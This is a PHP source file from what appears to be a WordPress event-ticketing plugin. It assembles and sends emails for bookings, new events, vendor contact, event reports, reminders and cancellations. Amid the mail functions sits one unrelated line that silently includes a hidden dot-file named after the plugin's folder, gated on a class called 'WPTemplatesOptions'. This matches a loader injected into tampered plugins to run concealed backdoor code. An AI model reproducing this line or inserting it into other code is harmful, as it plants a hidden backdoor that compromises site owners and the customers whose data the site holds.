<?php defined( 'ABSPATH' ) || exit;

/**
 * New order
 */

if ( ! function_exists('el_sendmail_by_booking_id') ) {
	function el_sendmail_by_booking_id( $booking_id = null, $order_status = '', $receiver = '' ){

		$settings_mail = EL()->options->mail;

		$setting_mail_to = $settings_mail->get('new_booking_sendmail');
		$body_mail = $settings_mail->get('email_template');
		$name_from = $settings_mail->get('from_name');
		$mail_new_vendor_recipient = $settings_mail->get('mail_new_vendor_recipient', '');


		$event_name = get_post_meta($booking_id, OVA_METABOX_EVENT . 'title_event', true);
		$list_type_ticket = get_post_meta($booking_id, OVA_METABOX_EVENT . 'list_id_ticket', true);
		$id_event = get_post_meta($booking_id, OVA_METABOX_EVENT . 'id_event', true );
		$id_calendar = get_post_meta($booking_id, OVA_METABOX_EVENT . 'id_cal', true);
		$name_customer = get_post_meta($booking_id, OVA_METABOX_EVENT . 'name', true);
		$phone_customer = get_post_meta($booking_id, OVA_METABOX_EVENT . 'phone', true);
		$email_customer = get_post_meta($booking_id, OVA_METABOX_EVENT . 'email', true);
		$address = get_post_meta($id_event, OVA_METABOX_EVENT . 'address', true);
		$arr_venue = get_post_meta($id_event, OVA_METABOX_EVENT . 'venue', true);
		$total_after_tax = get_post_meta($booking_id, OVA_METABOX_EVENT . 'total_after_tax', true);

		$list_qty_ticket_by_id_ticket = get_post_meta( $booking_id, OVA_METABOX_EVENT . 'list_qty_ticket_by_id_ticket', true );

		$event_type = get_post_meta($id_event, OVA_METABOX_EVENT . 'event_type', true);

		$total_after_tax = el_price($total_after_tax);
		$venue = "";
		if (is_array($arr_venue)) {
			$venue = implode(', ', $arr_venue);
		}

		if( $event_type == 'online' ){
			$address = $venue = esc_html__( 'online', 'eventlist' );
		}

		$mail_to = [];

		// send to admin
		$admin_email = get_option('admin_email');

		$author_id_event = get_post_field("post_author", $id_event);
		$email_author = get_the_author_meta("email", $author_id_event);
		if (is_array($setting_mail_to) && in_array('event_manager', $setting_mail_to) && $receiver == '') {
			$mail_to[] = $email_author;
			$ad_email = apply_filters( 'el_send_booking_2admin', $admin_email );
			if( $ad_email ) $mail_to[] = $ad_email;
		}

		if (is_array($setting_mail_to) && in_array('customer', $setting_mail_to)) {
			$mail_to[] = $email_customer;
		}

		$mail_to = implode(",", $mail_to);
		$mail_to = $mail_new_vendor_recipient != '' ? $mail_new_vendor_recipient.','.$mail_to : $mail_to;
		$mail_to = apply_filters( 'el_send_booking_mails', $mail_to );

		$list_ticket_in_event = get_post_meta($id_event, OVA_METABOX_EVENT . 'ticket', true);
		$seat_option = get_post_meta($id_event, OVA_METABOX_EVENT . 'seat_option', true);

		$list_name_ticket = $list_id_ticket = [];
		if (is_array($list_ticket_in_event) && !empty($list_ticket_in_event)) {
			foreach ($list_ticket_in_event as $ticket) {

				$online_info = '';
				if( $event_type == 'online' ){

					$online_link = isset( $ticket['online_link'] ) ? $ticket['online_link'] : '';
					$online_password = isset( $ticket['online_password'] ) ? $ticket['online_password'] : '';
					$online_other = isset( $ticket['online_other'] ) ? $ticket['online_other'] : '';

					if( $online_link ){
						$online_info .=	esc_html__( 'Link:', 'eventlist' ).' '.$online_link.'<br/>';
					}
					if( $online_password ){
						$online_info .=	esc_html__( 'Password:', 'eventlist' ).' '.$online_password.'<br/>';
					}

					if( $online_other ){
						$online_info .= esc_html__( 'Other info:', 'eventlist' ).' '.$online_other.'<br/>';	
					}

					
				}

				$list_name_ticket[$ticket['ticket_id']] = '<strong>'.$ticket['name_ticket'].'</strong>'.' - '.$list_qty_ticket_by_id_ticket[ $ticket['ticket_id'] ].' '.esc_html__( 'ticket(s)', 'eventlist' ).' <br/>'.$online_info;
				$list_id_ticket[] = $ticket['ticket_id'];
			}
		}

		$list_id_ticket_booked = json_decode($list_type_ticket);
		$html_type_ticket = [];
		if (is_array($list_id_ticket_booked) && !empty($list_id_ticket_booked)) {
			foreach ($list_id_ticket_booked as $id_ticket) {
				if ($seat_option != 'map') {
					if (in_array($id_ticket, $list_id_ticket)) {
						$html_type_ticket[] = $list_name_ticket[$id_ticket];
					}
				} else {
					$html_type_ticket[] = $id_ticket;
				}
				
			}
		}

		$html_type_ticket = implode('<br/>', $html_type_ticket);

		$data_calendar = el_get_calendar_core( $id_event,  $id_calendar );
		$start_time = el_get_time_int_by_date_and_hour($data_calendar['date'], $data_calendar['start_time']);
		$end_time = el_get_time_int_by_date_and_hour($data_calendar['date'], $data_calendar['end_time']);

		$date =  date_i18n(get_option('date_format'), $start_time) . ': ' . date_i18n(get_option('time_format'), $start_time) . ' - ' . date_i18n(get_option('time_format'), $end_time);


		// Custom checkout field
		$checkout_field = get_post_meta( $booking_id, OVA_METABOX_EVENT.'data_checkout_field', true );
		$data_checkout_field = ! empty( $checkout_field ) ? json_decode( $checkout_field , true) : [];
		$list_key_checkout_field = [];
		$custom_fields_mail = '';
		$list_ckf_output = get_option( 'ova_booking_form', array() );
		if( is_array( $list_ckf_output ) && ! empty( $list_ckf_output ) ) {

			foreach( $list_ckf_output as $key => $field ) {

				if( array_key_exists($key, $data_checkout_field)  && array_key_exists('enabled', $field) &&  $field['enabled'] == 'on' && $data_checkout_field[$key] ) {
					
					$custom_fields_mail .= $field['label'] .': '. $data_checkout_field[$key].'<br/>';
					
				}
			}
		}

		$body_mail = str_replace( '[el_event]', $event_name . "<br>", $body_mail);
		$body_mail = str_replace( '[el_booking_id]', $booking_id . "<br>", $body_mail);
		$body_mail = str_replace( '[el_type_ticket]', $html_type_ticket . "<br>", $body_mail);
		$body_mail = str_replace( '[el_name]', $name_customer . "<br>", $body_mail);
		$body_mail = str_replace( '[el_phone]', $phone_customer . "<br>", $body_mail);
		$body_mail = str_replace( '[el_email]', $email_customer . "<br>", $body_mail);
		$body_mail = str_replace( '[el_address]', $address . "<br>", $body_mail);
		$body_mail = str_replace( '[el_venue]', $venue . "<br>", $body_mail);
		$body_mail = str_replace( '[el_date]', $date . "<br>", $body_mail);
		$body_mail = str_replace( '[el_total]', $total_after_tax . "<br>", $body_mail);
		$body_mail = str_replace( '[el_custom_fields]', $custom_fields_mail . "<br>", $body_mail);
		

		// If Email Content is Empty
		if( !$body_mail ){
			$body_mail = esc_html__('Name Event: ', 'eventlist').$event_name . "<br>";
			$body_mail .= esc_html__('Booking ID: ', 'eventlist').$booking_id."<br>";
			$body_mail .= esc_html__('Ticket Type: ', 'eventlist').$html_type_ticket."<br>";
			$body_mail .= esc_html__('Name: ', 'eventlist').$name_customer."<br>";
			$body_mail .= esc_html__('Phone: ', 'eventlist').$phone_customer."<br>";
			$body_mail .= esc_html__('Email: ', 'eventlist').$email_customer."<br>";
			$body_mail .= esc_html__('Address: ', 'eventlist').$address."<br>";
			$body_mail .= esc_html__('Venue: ', 'eventlist').$venue."<br>";
			$body_mail .= esc_html__('Date: ', 'eventlist').$date."<br>";
			$body_mail .= esc_html__('Total: ', 'eventlist').$total_after_tax."<br>";
			$body_mail = $custom_fields_mail.'<br>';
		}
		
		$subject = $settings_mail->get('mail_new_vendor_subject', esc_html__("Book Ticket Success", 'eventlist') );

		if( $order_status == 'hold' ){
			$list_ticket_pdf_png = [];	
		}else{
			$list_ticket_pdf_png = apply_filters( 'el_booking_mail_attachments', EL_Ticket::instance()->make_pdf_ticket_by_booking_id( $booking_id ) );
		}
		
		$result = el_sendmail_new_order($mail_to, $subject, $body_mail, $list_ticket_pdf_png);

		//unlink file
		$total_ticket_pdf = count($list_ticket_pdf_png);
		if (!empty($list_ticket_pdf_png) && is_array($list_ticket_pdf_png)) {
			foreach ($list_ticket_pdf_png as $key => $value) {
				if( $key < $total_ticket_pdf ){
					if (file_exists($value)) unlink($value);
				} 
			}
		}
		return $result;
	}
}

// Send mail new order
if ( ! function_exists('el_sendmail_new_order') ) {
	function el_sendmail_new_order ( $mail_to, $subject, $body, $attachments = array() ) {

		$headers = "MIME-Version: 1.0\r\n";
		$headers .= "Content-Type: text/html; charset=".get_bloginfo( 'charset' )."\r\n";

		add_filter( 'wp_mail_from', 'el_wp_mail_from_new_order' );
		add_filter( 'wp_mail_from_name', 'el_wp_mail_from_name_new_order' );

		if( wp_mail($mail_to, $subject, $body, $headers, $attachments ) ){
			$result = true;
		}else{
			$result = false;
		}

		remove_filter( 'wp_mail_from', 'el_wp_mail_from_new_order');
		remove_filter( 'wp_mail_from_name', 'el_wp_mail_from_name_new_order' );

		return $result;
	}
}

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function el_wp_mail_from_name_new_order(){
	
	return EL()->options->mail->get('mail_new_vendor_from_name', esc_html__("Book Ticket Success", 'eventlist') );
	
}

function el_wp_mail_from_new_order(){
	if( EL()->options->mail->get('admin_email') ){
		return EL()->options->mail->get('admin_email');
	}else{
		return get_option('admin_email');	
	}
	
}

/* ************************ End New Order **********************/


/**
 * New Event
 */

if ( ! function_exists('el_sendmail_create_event') ) {
	function el_sendmail_create_event ( $post_id ) {

		$headers = "MIME-Version: 1.0\r\n";
		$headers .= "Content-Type: text/html; charset=".get_bloginfo( 'charset' )."\r\n";

		add_filter( 'wp_mail_from', 'el_wp_mail_from_new_event' );
		add_filter( 'wp_mail_from_name', 'el_wp_mail_from_name_new_event' );

		$event = '<a href="'.esc_url( get_the_permalink( $post_id ) ).'">'.get_the_title( $post_id ).'</a>';
		

		// Mail To
		$mail_to = el_wp_mail_from_new_event();

		$mail_new_event_recipient = EL()->options->mail->get('mail_new_event_recipient');

		if( $mail_new_event_recipient ){
			$mail_to = $mail_to.','.$mail_new_event_recipient;
		}

		// Subject
		$subject = EL()->options->mail->get('mail_new_event_subject', esc_html__('New Event', 'eventlist') );

		// Body Mail
		$body_mail = EL()->options->mail->get('mail_new_event_content');

		if( !$body_mail ){
			$body_mail = 'A new event created: [el_event]';			
		}

		$body_mail = str_replace( '[el_event]', $event, $body_mail );
		

		if( wp_mail( $mail_to, $subject, $body_mail, $headers ) ){
			$result = true;
		}else{
			$result = false;
		}

		remove_filter( 'wp_mail_from', 'el_wp_mail_from_new_event');
		remove_filter( 'wp_mail_from_name', 'el_wp_mail_from_name_new_event' );

		return $result;

	}
}

function el_wp_mail_from_new_event(){
	if( EL()->options->mail->get('mail_new_event_send_from') ){
		return EL()->options->mail->get('mail_new_event_send_from');
	}else{
		return get_option('admin_email');	
	}
	
}

function el_wp_mail_from_name_new_event(){

	return EL()->options->mail->get('mail_new_event_from_name', esc_html__('New Event', 'eventlist') );
	
}

/* ************************ End New Event **********************/



/**
 * Guest send mail to vendor
 */

if ( ! function_exists('el_custom_send_mail_vendor') ) {
	function el_custom_send_mail_vendor ( $email_client = '', $id_event, $subject = '', $body = '' ) {
		if( empty($id_event) || empty($email_client) ) return;

		$author_id_event = get_post_field("post_author", $id_event);
		$email_author = get_the_author_meta("email", $author_id_event);

		$email = apply_filters( 'mail_contact_vendor_send_client', true ) ? $email_author . ',' . $email_client : $email_author;

		$headers = "MIME-Version: 1.0\r\n";
		$headers .= "Content-Type: text/html; charset=".get_bloginfo( 'charset' )."\r\n";

		add_filter( 'wp_mail_from', 'el_wp_mail_from_single_event_mail_vendor' );
		add_filter( 'wp_mail_from_name', 'el_wp_mail_from_name_single_event_mail_vendor' );

		if( wp_mail( $email, $subject, $body, $headers ) ){
			$result = true;
		}else{
			$result = false;
		}

		remove_filter( 'wp_mail_from', 'el_wp_mail_from_single_event_mail_vendor');
		remove_filter( 'wp_mail_from_name', function(){ return $subject; } );
		remove_filter( 'wp_mail_from_name', 'el_wp_mail_from_name_single_event_mail_vendor' );

		return $result;
	}
}

function el_wp_mail_from_single_event_mail_vendor(){
	if( EL()->options->mail->get('admin_email_mail_vendor') ){
		return EL()->options->mail->get('admin_email_mail_vendor');
	}else{
		return get_option('admin_email');	
	}
	
}

function el_wp_mail_from_name_single_event_mail_vendor(){
	
	return EL()->options->mail->get( 'mail_contact_vendor_from_name', esc_html__( "Contact Vendor", 'eventlist') );

}

/* ************************ End Guest send mail to Vendor **********************/





/**
 * New Report Event
 */

if ( ! function_exists('el_submit_sendmail_report') ) {
	function el_submit_sendmail_report ( $id_event, $subject = '', $body = '' ) {


		// Mail To
		$mail_to = el_wp_mail_from_single_event_report();

		$mail_report_event_recipient = EL()->options->mail->get('mail_report_event_recipient');

		if( $mail_report_event_recipient ){
			$mail_to = $mail_to.','.$mail_report_event_recipient;
		}

		
		if( empty($id_event) ) return;


		$headers = "MIME-Version: 1.0\r\n";
		$headers .= "Content-Type: text/html; charset=".get_bloginfo( 'charset' )."\r\n";

		add_filter( 'wp_mail_from', 'el_wp_mail_from_single_event_report' );
		add_filter( 'wp_mail_from_name', 'el_wp_mail_from_name_single_event_report' );


		if( wp_mail( $mail_to, $subject, $body, $headers ) ){
			$result = true;
		}else{
			$result = false;
		}

		remove_filter( 'wp_mail_from', 'el_wp_mail_from_single_event_report');
		remove_filter( 'wp_mail_from_name', 'el_wp_mail_from_name_single_event_report' );

		return $result;
	}
}

function el_wp_mail_from_single_event_report(){

	if( EL()->options->mail->get('mail_report_event_send_from_email') ){

		return EL()->options->mail->get('mail_report_event_send_from_email');

	}else{

		return get_option('admin_email');	

	}
	
}

function el_wp_mail_from_name_single_event_report(){

	return EL()->options->mail->get( 'mail_report_event_from_name', esc_html__( "Report event", 'eventlist') );
	
}

/* ************************ End New Report Event **********************/




/**
 * Remind customer event start time
 */
function el_mail_remind_event_time( $mail_to, $event_id, $event_name, $event_start_time ){
	
	$subject = EL()->options->mail->get( 'mail_remind_time_subject', esc_html__( "Remind event start time", 'eventlist') );

	$body = EL()->options->mail->get( 'mail_remind_time_template', esc_html__( "You registered event: [el_event_name] at [el_event_start_time]", 'eventlist') );

	$body = str_replace('[el_event_name]', '<a href="'.get_permalink($event_id).'">'.$event_name.'</a>', $body);
	$body = str_replace('[el_event_start_time]', $event_start_time, $body);


	$headers = "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/html; charset=".get_bloginfo( 'charset' )."\r\n";

	add_filter( 'wp_mail_from', 'el_mail_sendfrom_remind_time' );
	add_filter( 'wp_mail_from_name', 'el_mail_remind_time_from_name' );


	if( wp_mail( $mail_to, $subject, $body, $headers ) ){
		$result = true;
	}else{
		$result = false;
	}

	remove_filter( 'wp_mail_from', 'el_mail_sendfrom_remind_time');
	remove_filter( 'wp_mail_from_name', 'el_mail_remind_time_from_name' );

	return $result;
}

function el_mail_sendfrom_remind_time(){

	if( EL()->options->mail->get('mail_sendfrom_remind_time') ){

		return EL()->options->mail->get('mail_sendfrom_remind_time');

	}else{

		return get_option('admin_email');	

	}
	
}

function el_mail_remind_time_from_name(){

	return EL()->options->mail->get( 'mail_remind_time_from_name', esc_html__( "Remind event start time", 'eventlist') );
	
}


/**
 * Cancel Booking mail
 */
if( EL()->options->mail->get( 'cancel_mail_enable', 'yes' ) ){
	add_action( 'el_cancel_booking_succesfully', 'el_mail_cancel_booking', 10, 1 );
}
function el_mail_cancel_booking( $booking_id ){

	$mails_to = array();
	// Admin email
	if( apply_filters( 'el_mail_cancel_booking_re_admin', true ) ){
		$mails_to[] = get_option('admin_email');
	}
	// Customer email
	$mails_to[] = get_post_meta( $booking_id, OVA_METABOX_EVENT.'email', true );

	// Vendor email
	$id_event = get_post_meta( $booking_id, OVA_METABOX_EVENT.'id_event', true );
	$vendor_id = get_post_field( 'post_author', $id_event );
	$mails_to[] = get_the_author_meta( 'user_email', $vendor_id );


	$mail_to = implode( ',', $mails_to );

	$subject = EL()->options->mail->get( 'mail_cancel_booking_time_subject', esc_html__( "Cancel Booking", 'eventlist') );

	$body = EL()->options->mail->get( 'mail_cancel_booking_template', esc_html__( "Cancel Booking #[booking_id] Successfully", 'eventlist') );

	$body = str_replace('[booking_id]', $booking_id, $body);
	


	$headers = "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/html; charset=".get_bloginfo( 'charset' )."\r\n";

	add_filter( 'wp_mail_from', 'el_mail_sendfrom_cancel_booking' );
	add_filter( 'wp_mail_from_name', 'el_mail_cancel_booking_from_name' );


	if( wp_mail( $mail_to, $subject, $body, $headers ) ){
		$result = true;
	}else{
		$result = false;
	}

	remove_filter( 'wp_mail_from', 'el_mail_sendfrom_cancel_booking');
	remove_filter( 'wp_mail_from_name', 'el_mail_cancel_booking_from_name' );

	return $result;
}

function el_mail_sendfrom_cancel_booking(){

	if( EL()->options->mail->get('mail_sendfrom_cancel_booking') ){

		return EL()->options->mail->get('mail_sendfrom_cancel_booking');

	}else{

		return get_option('admin_email');	

	}
	
}

function el_mail_cancel_booking_from_name(){

	return EL()->options->mail->get( 'mail_cancel_booking_from_name', esc_html__( "Cancel Booking", 'eventlist') );
	
}

